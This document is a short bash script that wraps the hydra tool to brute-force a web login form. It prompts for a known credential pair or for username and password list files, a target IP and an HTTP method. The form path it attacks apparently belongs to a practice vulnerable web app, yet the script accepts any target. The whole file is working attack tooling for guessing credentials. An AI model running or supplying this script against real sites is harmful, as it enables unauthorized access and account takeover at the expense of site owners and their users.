#!/bin/bash

clear
echo "A PROGRAM FOR BRUTEFORCING LOGIN PAGE"  #Written by OVERCOMER ISRAEL.......
echo "                                    "
echo "***********************************"

echo "Do you know the credentials: yes/no"  #Do you have the username or password
read ans
if [ "$ans" == "yes" ]
then
	read -p "Enter username: " username
	read -p "Enter password: " password
	read -p "Enter Site Ip address: " IP
	read -p "Enter method, get or post? " method #Is the the site a get our post methode?
hydra -l "${username}" -p "${password}" "${IP}" http-"${method}"-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login:Username and/or password incorrect"
elif [ "$ans" == "no" ]
then
	read -p "Enter userfile: " userfile #You need to have a txt file containing list of username
	read -p "Enter passfile: " passfile #You need to have a txt file containing list of passwords
	read -p "Enter Site IP address: " IP
	read -p "Enter method, get or post? " method

hydra -L "${userfile}" -P "${passfile}" "${IP}" http-"${method}"-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect"
else
	read -p "Please specify between yes or no "
fi
